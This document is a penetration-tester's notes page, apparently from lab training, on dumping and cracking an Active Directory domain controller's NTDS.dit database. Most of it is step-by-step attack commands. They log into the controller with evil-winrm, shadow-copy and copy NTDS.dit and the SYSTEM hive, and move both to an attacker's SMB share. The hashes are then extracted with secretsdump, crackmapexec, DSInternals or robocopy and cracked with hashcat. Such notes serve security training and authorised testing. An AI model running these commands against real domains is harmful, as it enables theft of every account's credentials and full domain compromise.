---
title: Attacking NTDS
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
---
# Attacking NTDS

By default, the NTDS file (NTDS.dit) is located in `%SystemRoot%\NTDS\Ntds.dit` of a domain controller. The .dit stands for directory information tree. 

## Alternative #1: vssadmin (locally)

**1.** Connecting to a DC with Evil-WinRM

```shell-session
evil-winrm -i $DomainControllerIP  -u $username -p $password
# Example:
# evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

**2.** Checking Local Group Membership

```shell-session
net localgroup
```

**3.** Checking User Account Privileges including Domain

```shell-session
net user $username
# Example: 
# net user bwilliamson
```

**4.** Creating Shadow Copy of C: We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install.

```shell-session
vssadmin CREATE  SHADOW /For=C:
```

Results:

```
Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

**5.** Copying NTDS.dit from the VSS: We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

```shell-session
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

**6.** We will also need either the SYSTEM hive or bootkey is required for local parsing. So let's save the system hive

```cmd
reg.exe save hklm\system C:\system.save
```

**7.** Transfer file to attacking machine. For instance, with [smbserver.py from impacket](smbserver.md).

```bash
# From the attacker machine (our kali) all we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the direct
#########################################
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

# From the victim's machine (windows)
#########################################
# If you are from powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\$ipAttacker\CompData
cmd.exe /c move system.save \\$ipAttacker\CompData

# If you have a cmd terminal
move C:\NTDS\NTDS.dit \\$ipAttacker\CompData
move system.save \\$ipAttacker\CompData

```

**8.** Extract and crack ntds.dit locally:

```bash
python ~/tools/impacket/examples/secretsdump.py -ntds ~/borrar/NTDS.dit  -system ~/borrar/system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```


## Alternative #2: crackmapexec (remotely)

```shell-session
crackmapexec smb $ip -u $username -p $password --ntds
# Example: 
# crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

Cracking a Single Hash with Hashcat

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```


## Alternative #3:  `DSInternals` module (locally)

The [DSInternals Framework](https://www.nuget.org/profiles/DSInternals) exposes several internal features of _Active Directory_ and can be used from any .NET application.

#### Installation

Since PowerShell 5, you can install the DSInternals module directly from the official [PowerShell Gallery](https://www.powershellgallery.com/packages/DSInternals/) by running the following command:

```powershell
Install-Module DSInternals -Force
```

The DSInternals PowerShell Module can also be installed using the official [Chocolatey package](https://chocolatey.org/packages/dsinternals-psmodule) by executing the following Chocolatey command:

```powershell
choco install dsinternals-psmodule --confirm
```

This package is self-contained and it will also install all dependencies. 

#### Commands to Extract the NTDS file + Boot Key 

```powershell
Import-Module .\DSInternals.psd1
# Extract the Boot Key from the SYSTEM Hive 
$key = Get-BootKey -SystemHivePath .\SYSTEM

# Extract NTLM Hashes for a Specific Account
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```


## Alternative #4: Robocopy (locally)

The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more.

Robocopy differs from the `copy` command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory.

```cmd-session
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
# -/B → Runs the copy operation in Backup mode, allowing the command to bypass file access restrictions (even for files locked by the system).
# E:\Windows\NTDS → The source folder, which in this case is the Active Directory (AD) database directory on a Windows Domain Controller.
# .\ntds → The destination folder (a local folder named ntds in the current directory).
# ntds.dit → The specific file being copied, which is the Active Directory database.
```


## Cracking ntds file

### secretsdump.py

We will need either the SYSTEM hive or bootkey:

```bash
python3 /opt/impacket/examples/secretsdump.py -ntds ~/borrar/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract

python3 /opt/impacket/examples/secretsdump.py -ntds ~/borrar/ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```


## Domain Password Analysis

Once we have extracted the NTDS database we can perform offline password cracking. 

We can  use a tool such as [DPAT](https://github.com/clr2of8/DPAT) to perform a domain password analysis.

 Our analysis can be included in the appendices of the report with metrics such as:
 
- Number of password hashes obtained
- Number of password hashes cracked
- Percent of password hashes cracked
- Top 10 passwords
- Password length breakdown
- Number of Domain Admin passwords cracked
- Number of Enterprise Admin passwords cracked